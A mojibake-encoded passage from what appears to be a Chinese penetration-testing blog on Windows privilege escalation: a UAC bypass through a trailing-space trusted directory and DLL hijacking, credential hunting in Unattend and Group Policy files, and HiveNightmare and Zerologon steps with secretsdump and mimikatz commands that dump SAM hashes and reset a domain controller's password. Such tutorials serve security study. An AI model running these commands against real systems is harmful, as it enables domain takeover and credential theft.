ä¿¡æ¯autoElevateå±æ€§å­—æ®µçš„å€¼ä¸ºTrue</li><li>æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶çš„ç­¾å</li><li>æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶æ˜¯å¦ä½äºç³»ç»Ÿå¯ä¿¡ä»»ç›®å½•ä¸­</li></ol><p>ç³»ç»Ÿåœ¨æ£€æŸ¥å¯ä¿¡ä»»ç›®å½•æ—¶ï¼Œç›¸å…³å‡½æ•°ä¼šå»æ‰å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä¸­çš„ç©ºæ ¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¯¥ç‰¹æ€§æ¥ç»•è¿‡ç¬¬ä¸‰ä¸ªæ¡ä»¶ï¼Œæ¯”å¦‚æ–‡ä»¶ä½äºâ€C:\Windows \System32â€ã€‚</p><blockquote><p>åŸºäºæ­¤åŸç†ï¼Œæµ‹è¯•äººå‘˜æ ¹æ®å¯ä¿¡ä»»ç›®å½•æ¥åˆ›å»ºä¸€ä¸ªåŒ…å«å°¾éšç©ºæ ¼çš„æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•å°†ä¸€ä¸ªç™½åå•ç¨‹åºå¤åˆ¶åˆ°æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•ä¸­ï¼Œé…åˆ DILåŠ«æŒç­‰æŠ€æœ¯å³å¯æˆåŠŸç»•è¿‡ UACã€‚</p></blockquote><p>å¤§è‡´æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li><p>å…ˆåˆ›å»ºæ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">md &quot;\\?\C:\Windows &quot;<br>md &quot;\\?\C:\Windows \System32&quot;<br>copy C:\Windows\System32\WinSAT.exe &quot;\\?\C:\Windows \System32\WinSAT.exe&quot; #è¿™é‡Œå¤åˆ¶ç™½åå•ç¨‹åºåˆ°æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•<br><span class="hljs-meta prompt_">#</span><span class="language-bash">\\?\å‰ç¼€æ˜¯ä¸ºäº†ä¿è¯è·¯å¾„è§£ææ­£ç¡®</span><br></code></pre></td></tr></table></figure></li><li><p>å¯åŠ¨è¯¥ç™½åå•ç¨‹åºç”¨Process Monitoræ£€æµ‹å…¶è¿›ç¨‹æ‰€åŠ è½½çš„DLL</p><p>ç„¶åé€‰æ‹©ä¸€ä¸ªDLLè¿›è¡ŒåŠ«æŒï¼Œæ³¨æ„æ„é€ çš„æ¶æ„DLLæ–‡ä»¶éœ€è¦ä¸åŸæ¥çš„DLLå…·æœ‰ç›¸åŒçš„å¯¼å‡ºå‡½æ•°ã€‚å¯ä»¥ä½¿ç”¨**ExportsToC++**å·¥å…·æ¥è·å–åŸDLLæ–‡ä»¶å¯¼å‡ºçš„å‡½æ•°å¹¶è‡ªåŠ¨ç”ŸæˆC++ä»£ç ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151448432.png" alt="image-20240410000758252"></p></li><li><p>ç®€å•ä¿®æ”¹ç”Ÿæˆä»£ç ï¼Œåœ¨DLLMainå…¥å£å‡½æ•°åŠ å…¥è¦æ‰§è¡Œçš„æ“ä½œï¼Œç„¶åç¼–è¯‘ç”Ÿæˆ64ä½çš„DLLæ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151448433.png" alt="image-20240410000823674"></p></li><li><p>å°†ç”ŸæˆDLLæ–‡ä»¶æ”¾å…¥æ¨¡æ‹Ÿå¯ä¿¡ä»»ç›®å½•å†è¿è¡Œç™½åå•ç¨‹åºå³å¯ã€‚</p></li></ol><h2 id="ç›¸å…³è¾…åŠ©å·¥å…·"><a href="#ç›¸å…³è¾…åŠ©å·¥å…·" class="headerlink" title="ç›¸å…³è¾…åŠ©å·¥å…·"></a>ç›¸å…³è¾…åŠ©å·¥å…·</h2><p><strong>UACME</strong></p><p>UACMEæ˜¯ä¸€ä¸ªä¸“ç”¨äºç»•è¿‡ WindowsUACçš„å¼€æºé¡¹ç›®,ç›®å‰å·²åŒ…å«äº†70å¤šç§ BypassUACçš„æ–¹æ³•ï¼Œé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><p>åœ¨UACMEé¡¹ç›®ä¸­ï¼Œæ¯ç§BypassUAC çš„æ–¹æ³•éƒ½æœ‰ä¸€ä¸ªæ•°å­—ç¼–å·ï¼Œç”±ä¸€ä¸ªåä¸ºAkagi.exe(éœ€è¦è‡ªè¡Œç¼–è¯‘ç”Ÿæˆ)çš„ä¸»ç¨‹åºè¿›è¡Œç»Ÿä¸€è°ƒç”¨ï¼Œç›¸å…³å‘½ä»¤å¦‚ä¸‹:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">akagi.exe [Key] [Param]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Keyï¼ŒæŒ‡å®šè¦ä½¿ç”¨çš„æ–¹æ³•çš„ç¼–å·</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Paramï¼ŒæŒ‡å®šç»•è¿‡ UACåè¦è¿è¡Œçš„ç¨‹åºæˆ–å‘½ä»¤ï¼Œé»˜è®¤å¯åŠ¨ä¸€ä¸ªå…³é—­äº† UACçš„ CMD çª—å£</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">å‘½ä»¤ç¤ºä¾‹å¦‚ä¸‹</span><br>Akagi.exe 23 C:\Windows\System32\cmd.exe<br></code></pre></td></tr></table></figure><p><strong>MetaSploit</strong></p><p>MetaSploitä¹Ÿæœ‰å†…ç½®ç”¨äºç»•è¿‡UACçš„æ¨¡å—</p><p><img src="http://cdn.clown2024.cn/202407151448434.png" alt="image-20240410001516563"></p><p>æˆåŠŸåˆ©ç”¨è¿™äº›æ¨¡å—ï¼Œå°†å¾—åˆ°ä¸€ä¸ªå…³é—­äº†UACä¿æŠ¤çš„ Meterpreter,ç„¶åæ‰§è¡Œ getsystemå‘½ä»¤ï¼Œå¯ç›´æ¥æå‡è‡³SYSTEMæƒé™ã€‚</p><h1 id="ç”¨æˆ·å‡­æ®æ“ä½œ"><a href="#ç”¨æˆ·å‡­æ®æ“ä½œ" class="headerlink" title="ç”¨æˆ·å‡­æ®æ“ä½œ"></a>ç”¨æˆ·å‡­æ®æ“ä½œ</h1><h2 id="æšä¸¾unattendedå‡­æ®"><a href="#æšä¸¾Unattendedå‡­æ®" class="headerlink" title="æšä¸¾Unattendedå‡­æ®"></a>æšä¸¾Unattendedå‡­æ®</h2><p>æ— äººå€¼å®ˆ(Unattended)å®‰è£…å…è®¸åº”ç”¨ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨ä¸‹è‡ªåŠ¨å®‰è£…ã€‚æ— äººå€¼å®ˆå®‰è£…çš„é—®é¢˜æ˜¯ä¼šåœ¨ç³»ç»Ÿä¸­æ®‹ç•™ä¸€äº›é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­å¯èƒ½åŒ…å«æœ¬åœ°ç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¸¸è§çš„è·¯å¾„å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C:\sysprep.inf<br>C:\syspreg\sysprep.xml<br>C:\Windows\system32\sysprep.inf<br>C:\Windows\system32\sysprep\sysprep.xml<br>C:\unattend.xml<br>C:\Windows\Panther\Unattend.xml<br>C:\Windows\PantheriUnattended.xml<br>C:\Windows\PantheriUnattendiUnattended.xml<br>C:\Windows\Panther\Unattend\Unattend.xml<br>C:\Windows\System32\Sysprep\Unattend.xml<br>C:\Windows\System32\Sysprep\PantherUnattend.xml<br></code></pre></td></tr></table></figure><p>å¯ä»¥å…¨ç›˜æœç´¢ä¸Šè¿°é…ç½®æ–‡ä»¶ï¼Œå¹¶æ£€ç´¢Userã€Accountsã€UserAccountsã€LocalAccountsã€Administratorã€Passwordç­‰å…³é”®å­—æ¥è·å–ç®¡ç†å‘˜å‡­æ®ã€‚</p><p>MetaSploit æä¾›äº† post&#x2F;windows&#x2F;gather&#x2F;enum_unattend æ¨¡å—ï¼Œå¯ä»¥ä» Unattend é…ç½®æ–‡ä»¶ä¸­è‡ªåŠ¨åŒ–æ£€ç´¢å‡ºç”¨æˆ·å¯†ç </p><p><img src="http://cdn.clown2024.cn/202407151448435.png" alt="image-20240410002428433"></p><h2 id="è·å–ç»„ç­–ç•¥å‡­æ®"><a href="#è·å–ç»„ç­–ç•¥å‡­æ®" class="headerlink" title="è·å–ç»„ç­–ç•¥å‡­æ®"></a>è·å–ç»„ç­–ç•¥å‡­æ®</h2><p>å¾®è½¯åœ¨ Windows Server 2008ä¸­å¼•å…¥äº†ç»„ç­–ç•¥é¦–é€‰é¡¹ï¼Œå…è®¸ç½‘ç»œç®¡ç†å‘˜å¯¹æŒ‡å®šè®¡ç®—æœºå’Œç”¨æˆ·é…ç½®ç‰¹å®šçš„è®¾ç½®ã€‚<br>åœ¨å¤§å‹ä¼ä¸šæˆ–ç»„ç»‡çš„åŸŸç¯å¢ƒä¸­ï¼Œç½‘ç»œç®¡ç†å‘˜å¾€å¾€ä¼šé€šè¿‡ä¸‹å‘ç»„ç­–ç•¥çš„æ–¹å¼å¯¹æ‰€æœ‰åŠ å…¥åŸŸçš„è®¡ç®—æœºçš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç è¿›è¡Œæ‰¹é‡ä¿®æ”¹ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151448436.png" alt="image-20240410003626595"></p><p>åœ¨æ–°å»ºä¸€ä¸ªç»„ç­–ç•¥åï¼ŒåŸŸæ§åˆ¶å™¨ä¼šè‡ªåŠ¨åœ¨SYSVOL å…±äº«ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ªXML æ–‡ä»¶è¯¥æ–‡ä»¶ä¿å­˜äº†ç»„ç­–ç•¥æ›´æ–°åçš„å¯†ç ã€‚SYSVOLæ˜¯åœ¨å®‰è£…æ´»åŠ¨ç›®å½•æ—¶åˆ›å»ºçš„ä¸€ä¸ªç”¨äºå­˜å‚¨å…¬å…±æ–‡ä»¶æœåŠ¡å™¨å‰¯æœ¬çš„å…±äº«æ–‡ä»¶å¤¹ï¼Œä¸»è¦å­˜æ”¾ç™»å½•è„šæœ¬ã€ç»„ç­–ç•¥æ•°æ®åŠå…¶ä»–åŸŸæ§åˆ¶å™¨éœ€è¦çš„åŸŸä¿¡æ¯ï¼Œå¹¶åœ¨æ‰€æœ‰ç»è¿‡èº«ä»½éªŒè¯çš„åŸŸç”¨æˆ·æ´»åŸŸä¿¡ä»»ç”¨æˆ·èŒƒå›´å†…å…±äº«</p><p><img src="http://cdn.clown2024.cn/202407151448437.png" alt="image-20240410003755692"></p><p>æ”¹ç›®å½•ä¸­ä¸€ä¸ªGroups.xmlæ–‡ä»¶ï¼Œå…¶ä¸­çš„cpasswordå­—æ®µä¿å­˜äº†AES256åŠ å¯†åçš„ç”¨æˆ·å¯†ç </p><p><img src="http://cdn.clown2024.cn/202407151448438.png" alt="image-20240410003851164"></p><p>ä½†æ˜¯åæ¥å¾®è½¯åœ¨2012å¹´å…¬å¸ƒäº†åŠ å¯†ç§é’¥ï¼Œæ‰€ä»¥ç»è¿‡è®¤è¯çš„ç”¨æˆ·éƒ½å¯ä»¥è¯»å–å¹¶è§£å¯†å‡ºæ¥ã€‚</p><p>MetaSploit æ¡†æ¶å†…ç½® post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp æ¨¡å—ï¼Œå¯ä»¥è‡ªåŠ¨åŒ–æœç´¢ä½äºSYSVOLå…±äº«ç›®å½•ä¸­çš„XMLï¼Œå¹¶ä»ä¸­è§£å¯†å‡ºç”¨æˆ·å¯†ç </p><p><img src="http://cdn.clown2024.cn/202407151448439.png" alt="image-20240410004027561"></p><h2 id="hivenightmare"><a href="#HiveNightmare" class="headerlink" title="HiveNightmare"></a>HiveNightmare</h2><p>2021å¹´7æœˆï¼ŒMicrosoftå‘å¸ƒç´§æ€¥å®‰å…¨å…¬å‘Šï¼Œå…¬å¼€äº†ä¸€ä¸ªWindows ææƒæ¼æ´(CVE-2021-36934)ã€‚ç”±äº Windowsä¸­å¤šä¸ªç³»ç»Ÿæ–‡ä»¶çš„è®¿é—®æ§åˆ¶åˆ—è¡¨(ACL)è¿‡äºå®½æ¾ä½¿å¾—ä»»ä½•æ ‡å‡†ç”¨æˆ·éƒ½å¯ä»¥ä»ç³»ç»Ÿå·å½±å‰¯æœ¬ä¸­è¯»å–åŒ…æ‹¬SAMã€SYSTEMã€SECURITY åœ¨å†…çš„å¤šä¸ªç³»ç»Ÿæ–‡ä»¶ã€‚ç”±äºSAM æ–‡ä»¶æ˜¯å­˜å‚¨ç”¨æˆ·å¯†ç å“ˆå¸Œå€¼çš„å®‰å…¨è´¦æˆ·ç®¡ç†å™¨ï¼Œè¿›è€Œå¯ä»¥è·å–æ‰€æœ‰æœ¬åœ°ç”¨æˆ· NTLM Hashå€¼ï¼Œé€šè¿‡æš´åŠ›ç ´è§£æˆ–å“ˆå¸Œä¼ é€’ç­‰æ–¹æ³•å°±èƒ½å®ç°æœ¬åœ°æƒé™æå‡ã€‚</p><p>è¯¥æ¼æ´åˆ©ç”¨éœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼š</p><ol><li>å·²å¯ç”¨ç³»ç»Ÿä¿æŠ¤(é»˜è®¤å¯ç”¨)</li><li>ç³»ç»Ÿä¸Šå­˜åœ¨å·²åˆ›å»ºçš„ç³»ç»Ÿè¿˜åŸç‚¹</li><li>ç³»ç»Ÿå¯ç”¨æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·</li></ol><blockquote><p>Windowsç³»ç»Ÿä¿æŠ¤ï¼šæ˜¯Windowsæ“ä½œç³»ç»Ÿçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œæ—¨åœ¨ä¿æŠ¤è®¡ç®—æœºçš„ç³»ç»Ÿæ–‡ä»¶å’Œè®¾ç½®å…å—æ„å¤–æ›´æ”¹æˆ–æ¶æ„è½¯ä»¶çš„æŸå®³ã€‚å®ƒé€šè¿‡åˆ›å»ºç³»ç»Ÿè¿˜åŸç‚¹å’Œç›‘æ§ç³»ç»Ÿæ–‡ä»¶çš„å®Œæ•´æ€§æ¥å®ç°è¿™ä¸€ç›®æ ‡ã€‚</p><p>å…·ä½“æ¥è¯´ï¼ŒWindowsç³»ç»Ÿä¿æŠ¤æœ‰ä¸¤ä¸ªä¸»è¦åŠŸèƒ½ï¼š</p><ol><li>ç³»ç»Ÿè¿˜åŸç‚¹ï¼šWindowsç³»ç»Ÿä¿æŠ¤ä¼šå®šæœŸåˆ›å»ºç³»ç»Ÿè¿˜åŸç‚¹ï¼Œè¿™æ˜¯è®¡ç®—æœºåœ¨æŸä¸ªæ—¶é—´ç‚¹çš„å¿«ç…§ã€‚å½“è®¡ç®—æœºé‡åˆ°é—®é¢˜æˆ–ç³»ç»Ÿæ–‡ä»¶æŸåæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç³»ç»Ÿè¿˜åŸç‚¹å°†ç³»ç»Ÿè¿˜åŸåˆ°å…ˆå‰çš„æ­£å¸¸çŠ¶æ€ã€‚ç³»ç»Ÿè¿˜åŸç‚¹è®°å½•äº†æ“ä½œç³»ç»Ÿã€é©±åŠ¨ç¨‹åºå’Œæ³¨å†Œè¡¨çš„çŠ¶æ€ï¼Œè€Œä¸ä¼šå½±å“ä¸ªäººæ–‡ä»¶å’Œæ•°æ®ã€‚</li><li>æ–‡ä»¶å®Œæ•´æ€§ç›‘æ§ï¼šWindowsç³»ç»Ÿä¿æŠ¤è¿˜ä¼šç›‘æ§ç³»ç»Ÿæ–‡ä»¶çš„å®Œæ•´æ€§ã€‚å®ƒä¼šå®šæœŸæ‰«æå…³é”®ç³»ç»Ÿæ–‡ä»¶ï¼ŒéªŒè¯å…¶å®Œæ•´æ€§ï¼Œå¹¶ä¿®å¤ä»»ä½•è¢«ä¿®æ”¹æˆ–æŸåçš„æ–‡ä»¶ã€‚è¿™æœ‰åŠ©äºé˜²æ­¢æ¶æ„è½¯ä»¶æˆ–ç”¨æˆ·æ„å¤–æ›´æ”¹ç³»ç»Ÿæ–‡ä»¶ï¼Œä»è€Œç¡®ä¿ç³»ç»Ÿçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ã€‚</li></ol></blockquote><p>æ»¡è¶³ä¹‹åæ ‡å‡†ç”¨æˆ·å³å¯è®¿é—®å’Œè½¬å‚¨SAMã€SYSTEMã€SECURITYæ–‡ä»¶ï¼Œè·¯å¾„ä¸€èˆ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C:\Windows\System32\config\SAM<br>C:\Windows\System32\config\SECURITY<br>C:\Windows\System32\config\SYSTEM<br></code></pre></td></tr></table></figure><p>æ ‡å‡†ç”¨æˆ·å¯ä»¥æ‰§è¡Œä¸‹é¢å‘½ä»¤æŸ¥çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">icals C:\Windows\System32\config\SAM<br></code></pre></td></tr></table></figure><p>å‡ºç°ä¸‹é¢å†…å®¹åˆ™è¡¨ç¤ºå­˜åœ¨è¯¥æ¼æ´</p><p><img src="http://cdn.clown2024.cn/202407151448440.png" alt="image-20240410161153281"></p><p>ç„¶åå°†HiveNightmare.exeåˆ©ç”¨ç¨‹åºä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºç›´æ¥è¿è¡Œå°±å¯ä»¥å°†è¿™ä¸‰ä¸ªæ–‡ä»¶è½¬å‚¨åˆ°å½“å‰ç›®å½•ï¼Œé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/GossiTheDog/HiveNightmare">https://github.com/GossiTheDog/HiveNightmare</a></p><p><img src="http://cdn.clown2024.cn/202407151448441.png" alt="image-20240410161632625"></p><p>æœ€åä½¿ç”¨Impacket é¡¹ç›®ä¸­çš„secretsdump.pyå¯¼å‡º SAM æ–‡ä»¶ä¸­çš„å“ˆå¸Œå€¼ï¼Œé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">python secretsdump.py -sam SAM-<span class="hljs-number">2022</span>-01-<span class="hljs-number">18</span> -system SYSTEM-<span class="hljs-number">2022</span>-01-<span class="hljs-number">18</span> -security SECURITY-<span class="hljs-number">2022</span>-01-<span class="hljs-number">18</span> LOCAL<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448442.png" alt="image-20240410161855268"></p><blockquote><p>ç”¨mimikatzä¹Ÿä¸€æ ·</p></blockquote><h2 id="zerologonåŸŸå†…ææƒ"><a href="#ZerologonåŸŸå†…ææƒ" class="headerlink" title="ZerologonåŸŸå†…ææƒ"></a>ZerologonåŸŸå†…ææƒ</h2><p>Zerologon(CVE-2020-1472)æ˜¯Netlogonè¿œç¨‹åè®®çš„ä¸€ä¸ªç‰¹æƒæå‡æ¼æ´ï¼Œå¯ä»¥åœ¨ä¸æä¾›ä»»ä½•å‡­æ®çš„æƒ…å†µä¸‹é€šè¿‡èº«ä»½éªŒè¯ï¼Œå¹¶å®ç°åŸŸå†…ææƒã€‚</p><p><strong>Netlogonåè®®</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Netlogonè¿œç¨‹åè®®æ˜¯ä¸€ç§ç”¨äºWindowsæ“ä½œç³»ç»Ÿçš„ç½‘ç»œé€šä¿¡åè®®ï¼Œç”¨äºå¤„ç†åŸŸæ§åˆ¶å™¨å’Œå®¢æˆ·ç«¯è®¡ç®—æœºä¹‹é—´çš„èº«ä»½éªŒè¯å’Œæˆæƒã€‚å®ƒæ˜¯WindowsåŸŸç¯å¢ƒä¸­çš„æ ¸å¿ƒåè®®ä¹‹ä¸€ã€‚<br><br>Netlogonè¿œç¨‹åè®®åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨ä»¥ä¸‹ä¸¤ä¸ªå¸¸ç”¨ç«¯å£ï¼š<br><br>TCP/UDPç«¯å£ 445ï¼šè¿™æ˜¯SMBï¼ˆServer Message Blockï¼‰åè®®çš„é»˜è®¤ç«¯å£ï¼ŒNetlogonè¿œç¨‹åè®®åœ¨å†…éƒ¨ä½¿ç”¨SMBè¿›è¡Œé€šä¿¡ã€‚SMBæ˜¯ä¸€ç§ç”¨äºæ–‡ä»¶å’Œæ‰“å°å…±äº«ä»¥åŠè¿œç¨‹ç®¡ç†çš„åè®®ï¼ŒNetlogonåˆ©ç”¨SMBæ¥è¿›è¡ŒåŸŸæ§åˆ¶å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„èº«ä»½éªŒè¯å’Œæˆæƒã€‚<br><br>TCP/UDPç«¯å£ 139ï¼šè¿™æ˜¯NetBIOSï¼ˆNetwork Basic Input/Output Systemï¼‰çš„æ—§ç‰ˆç«¯å£ï¼ŒNetlogonåœ¨æŸäº›æ—§ç‰ˆæœ¬çš„Windowsæ“ä½œç³»ç»Ÿä¸­å¯èƒ½ä½¿ç”¨è¯¥ç«¯å£è¿›è¡Œé€šä¿¡ã€‚ç„¶è€Œï¼Œä»Windows Vistaå’ŒWindows Server 2008å¼€å§‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒNetlogonä½¿ç”¨SMBåè®®çš„ç«¯å£445ã€‚<br></code></pre></td></tr></table></figure><p>è¯¥æ¼æ´çš„æœ€å¸¸è§çš„åˆ©ç”¨æ–¹æ³•æ˜¯è°ƒç”¨Netlogonä¸­çš„RPCå‡½æ•° NetrServerPasswordSet2æ¥é‡ç½®åŸŸæ§åˆ¶å™¨çš„å¯†ç ã€‚æ³¨æ„ï¼Œè¿™é‡Œé‡ç½®çš„æ˜¯åŸŸæ§æœºå™¨è´¦æˆ·çš„å¯†ç ï¼Œè¯¥å¯†ç ç”±ç³»ç»Ÿéšæœºç”Ÿæˆï¼Œå¯†ç å¼ºåº¦æ˜¯ 120ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”ä¼šå®šæ—¶æ›´æ–°ã€‚</p><p>æœºå™¨ç”¨æˆ·æ‹¥æœ‰åŸŸç”¨æˆ·çš„ä¸€åˆ‡å±æ€§ï¼Œåœ¨ç‰¹å®šæ„ä¹‰ä¸Šä¹Ÿæ˜¯ä¸€ç§åŸŸç”¨æˆ·ã€‚åŸŸå†…çš„æœºå™¨è´¦æˆ·ä»¥â€œæœºå™¨å+$â€æ¥å‘½åå¦‚åŸŸæ§åˆ¶å™¨DC-1çš„æœºå™¨ç”¨æˆ·å°±æ˜¯DC-1$ã€‚</p><p>ä½†æ˜¯æœºå™¨è´¦æˆ·ä¸å…è®¸ç™»å½•ï¼Œå› æ­¤ä¸èƒ½é‡ç½®å¯†ç åç›´æ¥ç™»å½•ï¼Œæœºå™¨è´¦æˆ·é»˜è®¤æƒ…å†µä¸‹æ‹¥æœ‰DCSyncæƒé™ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ DCSyncæ”»å‡»å¯¼å‡ºåŸŸç®¡ç†å‘˜å¯†ç çš„å“ˆå¸Œå€¼ï¼Œè¿›è€Œè·å–åŸŸæ§æƒé™ã€‚</p><p>æ”»å‡»è¿‡ç¨‹ï¼š</p><ol><li><p>é‡ç½®åŸŸæ§å¯†ç </p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 cve-2020-1472-exploit.py DC-1 10.10.10.11 #å°†åŸŸæ§çš„å¯†ç ç½®ç©ºï¼Œè¯¥æ”»å‡»è„šæœ¬å¯ä»¥ç½‘ä¸ŠæŸ¥æ‰¾<br></code></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨ secretsdump.pyä»¥ç©ºå¯†ç è¿æ¥ä¸ŠåŸŸæ§ï¼Œå¹¶å¯¼å‡ºåŸŸç®¡ç†å‘˜çš„å“ˆå¸Œå€¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 secretdump.py hack-my.com/DC-1\$@10.10.10.11 -just-dc-user &quot;hack-my\administrator&quot; -no-pass<br></code></pre></td></tr></table></figure></li><li><p>ç„¶åæ‰§è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»è·å–åŸŸæ§çš„SYSTEMæƒé™</p><p><img src="http://cdn.clown2024.cn/202407151448443.png" alt="image-20240410164025687"></p></li></ol><p>ä¹Ÿå¯ä»¥ä½¿ç”¨mimikatz</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;lsadump::zerologon /target:10.10.10.11 /ntlm /null /account:Dc-1$/exploit&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/targetï¼ŒæŒ‡å®šåŸŸæ§åœ°å€ï¼›/accountï¼ŒæŒ‡å®šåŸŸæ§çš„æœºå™¨è´¦æˆ·</span><br></code></pre></td></tr></table></figure><p>æ”»å‡»ç»“æŸåè¿˜éœ€è¦åŠæ—¶æ¢å¤åŸŸæ§å¯†ç ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´åŸŸæ§åˆ¶å™¨è„±åŸŸã€‚ä¸»è¦åŸå› æ˜¯åŸŸæ§ NTDS.dit ä¸­å­˜å‚¨çš„å¯†ç å’ŒåŸŸæ§æœ¬åœ°æ³¨å†Œè¡¨ä¸­å­˜å‚¨çš„å¯†ç ä¸ä¸€è‡´ã€‚</p><ol><li><p>å…ˆå¯¼å‡ºæœ¬åœ°æ³¨å†Œè¡¨çš„å€¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg save HKLM\SYSTEM system.save<br>reg save HKLM\SAM sam.save<br>reg save HKLM\SECURITY security.save<br></code></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨secretsdump.pyå¯¼å‡ºæ³¨å†Œè¡¨ä¸­çš„å“ˆå¸Œå€¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python secretsdump.py -sam sam.save -system system.save -security security.save LOCAL<br></code></pre></td></tr></table></figure><p>ç®­å¤´æ‰€æŒ‡å³å½“å‰æœºå™¨ç”¨æˆ·å¯†ç </p><p><img src="http://cdn.clown2024.cn/202407151448444.png" alt="image-20240410164855235"></p></li><li><p>é€šè¿‡è¿è¡Œ CVE-2020-1472 ä¸­çš„ restorepassword.py æ¢å¤åŸŸæ§å¯†ç </p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">pvthon3 restorepassword.py hack-my.com/DC-1@DC-1 -target-ip 10.10.10.11 -hexpass &lt;å¯¼å‡ºçš„å“ˆå¸Œå€¼&gt;<br></code></pre></td></tr></table></figure></li></ol><p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨mimikazeæ¢å¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lsadump::postzerologon /target:hack-my.com /account:DC-1$<br></code></pre></td></tr></table></figure><h1 id="print-spoolerææƒæ¼æ´"><a href="#Print-Spoolerææƒæ¼æ´" class="headerlink" title="Print Spoolerææƒæ¼æ´"></a>Print Spoolerææƒæ¼æ´</h1><p>Print Spooler æ˜¯ Windows ç³»ç»Ÿçš„æ‰“å°åå°å¤„ç†æœåŠ¡ï¼Œç”¨æ¥ç®¡ç†æ‰€æœ‰æœ¬åœ°å’Œç½‘ç»œæ‰“å°é˜Ÿåˆ—ï¼Œå¹¶æ§åˆ¶æ‰€æœ‰æ‰“å°å·¥ä½œã€‚è¯¥æœåŠ¡åœ¨ Windows ä¸­ä¸ºé»˜è®¤å¼€å¯çŠ¶æ€</p><p><img src="http://cdn.clown2024.cn/202407151448445.png" alt="image-20240410165124444"></p><p><img src="http://cdn.clown2024.cn/202407151448446.png" alt="image-20240410165241804"></p><h2 id="printdemon"><a href="#PrintDemon" class="headerlink" title="PrintDemon"></a>PrintDemon</h2><p>2020å¹´5æœˆ12æ—¥ï¼Œå¾®è½¯å‘å¸ƒå®‰å…¨æ›´æ–°è¡¥ä¸ï¼Œå…¬å¼€äº†ä¸€ä¸ªåä¸ºâ€œPrintDemonâ€çš„æœ¬åœ°ææƒæ¼æ´(CVE-2020-1048)ã€‚ç”±äº Windows Print Spooler æœåŠ¡å­˜åœ¨ç¼ºé™·ï¼Œç”¨æˆ·å¯ä»¥åœ¨ç³»ç»Ÿä¸Šå†™å…¥ä»»æ„æ–‡ä»¶ï¼Œå¹¶å¯ä»¥å€ŸåŠ©å…¶ä»–æ–¹æ³•æå‡æƒé™ã€‚è¯¥æ¼æ´å¹¿æ³›å½±å“ Windows ç³»ç»Ÿçš„å„ç‰ˆæœ¬ã€‚</p><h2 id="printnightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h2><p>PrintNightmare æ˜¯å¹¿æ³›å½±å“ Windows ç³»ç»Ÿå„ç‰ˆæœ¬çš„ä¸¥é‡å®‰å…¨æ¼æ´ï¼Œå‘ç”Ÿåœ¨ WindowsPrint Spooler æœåŠ¡ä¸­ï¼Œæœ‰ä¸¤ç§å˜ä½“ï¼Œä¸€ç§å¯¼è‡´æƒé™æå‡(CVE-2021-1675)ï¼Œå¦ä¸€ç§å…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œ(CVE-2021-34527)ã€‚</p><p>æ 